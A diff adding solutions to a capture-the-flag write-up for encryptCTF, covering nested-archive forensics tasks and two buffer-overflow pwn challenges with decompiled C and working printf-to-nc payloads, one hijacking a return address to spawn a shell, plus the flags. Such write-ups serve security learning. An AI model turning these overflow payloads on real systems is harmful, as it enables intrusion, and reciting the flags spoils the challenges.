@@ -303,7 +303,9 @@ Then we just AES decrypt, e.g. using PyCrypto:
 
 **Solution**
 
-(TODO)
+Unzip ad nauseam.
+
+`encryptCTF{w422up_b14tch3s}`
 
 ## 100 Forensics / Wi Will H4CK YOU!! ##
 
@@ -340,7 +342,11 @@ Then we just AES decrypt, e.g. using PyCrypto:
 
 **Solution**
 
-(TODO)
+Unzip ad nauseam #2: electric boogaloo.
+
+**Note:** these challenges are trivial e.g. on OS X where any archive file can be double-clicked to unzip. This challenge has a file wrapped in many layers of differing archive / compression methods.
+
+`encryptCTF{f33ls_g00d_d0nt_it?}`
 
 ## 1 Misc / sanity check ##
 
@@ -481,7 +487,41 @@ here's your flag: encryptCTF{1t_w4s_h4rd3r_th4n_1_th0ught}
 
 **Solution**
 
-(TODO)
+After decompilation:
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char input[64]; // [esp+1Ch] [ebp-44h]
+  char check[4]; // [esp+5Ch] [ebp-4h]
+
+  setvbuf(stdout, 0, 2, 0);
+  puts("How's the josh?");
+  gets(input);
+  if ( !memcmp(check, "H!gh", 4u) )
+  {
+    puts("Good! here's the flag");
+    print_flag();
+  }
+  else
+  {
+    puts("Your josh is low!\nBye!");
+  }
+  return 0;
+}
+```
+
+`gets` is used here on user input, which means we have a buffer overflow vulnerability, and we can override the value in `check`.
+
+```bash
+$ printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaH\x21gh\n" | nc 104.154.106.182 1234
+How's the josh?
+Good! here's the flag
+```
+
+(note `\x21` to escape a `!` which is special in `bash`)
+
+`encryptCTF{L3t5_R4!53_7h3_J05H}`
 
 ## 50 Pwn / pwn1 ##
 
@@ -492,8 +532,6 @@ here's your flag: encryptCTF{1t_w4s_h4rd3r_th4n_1_th0ught}
 > <span style="color:#990000;">```nc 104.154.106.182 2345```</span>
 > 
 > author: codacker
-> 
-> 
 
 **Files provided**
 
@@ -501,7 +539,44 @@ here's your flag: encryptCTF{1t_w4s_h4rd3r_th4n_1_th0ught}
 
 **Solution**
 
-(TODO)
+After decompilation:
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s[128]; // [esp+10h] [ebp-80h]
+
+  setvbuf(stdout, 0, 2, 0);
+  printf("Tell me your name: ");
+  gets(s);
+  printf("Hello, %s\n", s);
+  return 0;
+}
+```
+
+There is also a `shell` function loaded at address `0x080484AD`:
+
+```c
+int shell()
+{
+  return system("/bin/bash");
+}
+```
+
+We overflow the `s` buffer and a bit more to replace the return pointer with the address of `shell`.
+
+```bash
+$ (printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xAD\x84\x04\x08\n"; cat -) | nc 104.154.106.182 2345
+Tell me your name: Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa??
+whoami
+pwn1
+ls
+flag.txt
+pwn1
+cat flag.txt
+```
+
+`encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}`
 
 ## 100 Pwn / pwn2 ##
 
